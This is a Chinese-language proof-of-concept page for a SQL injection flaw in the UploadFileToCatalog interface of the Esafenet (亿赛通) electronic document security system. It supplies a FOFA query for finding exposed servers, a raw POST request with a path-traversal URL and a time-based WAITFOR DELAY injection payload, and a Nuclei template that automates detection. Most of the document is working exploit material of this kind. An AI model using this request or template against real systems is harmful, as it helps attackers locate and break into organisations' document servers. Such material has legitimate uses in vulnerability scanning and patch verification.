## 亿赛通电子文档安全管理系统 UploadFileToCatalog SQL注入漏洞

亿某通电子文档安全管理系统 UploadFileToCatalog接口的id参数处对传入的数据没有预编译和充足的校验，导致该接口存在SQL注入漏洞，恶意攻击者可能通过该漏洞获取服务器信息或者直接获取服务器权限

## fofa
```
body="/CDGServer3/index.jsp"
```

## poc
```
POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
 
id=1';WAITFOR DELAY '0:0:3'--
```

![8ce5da8fddd2d106e5eadb6e6c705f69](https://github.com/wy876/POC/assets/139549762/4fdf4a1c-f49a-47bc-9c1c-3d663b1d62e6)

## Nuclei
```
id: CDG-UploadFileToCatalog-SQL

info:
  name:  由于某赛通电子文档安全管理系统 UploadFileToCatalog接口的id参数处对传入的数据没有预编译和充足的校验，导致该接口存在SQL注入漏洞，恶意攻击者可能通过该漏洞获取服务器信息或者直接获取服务器权限
  author: WLF
  severity: high
  metadata: 
    fofa-query: body="/CDGServer3/index.jsp"
variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"
http:
  - raw:
      - |
        POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1
        
        id=1';WAITFOR DELAY '0:0:5'--



      

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration>=4 && duration<=7'

      - type: dsl
        dsl:
           - status_code == 200
```
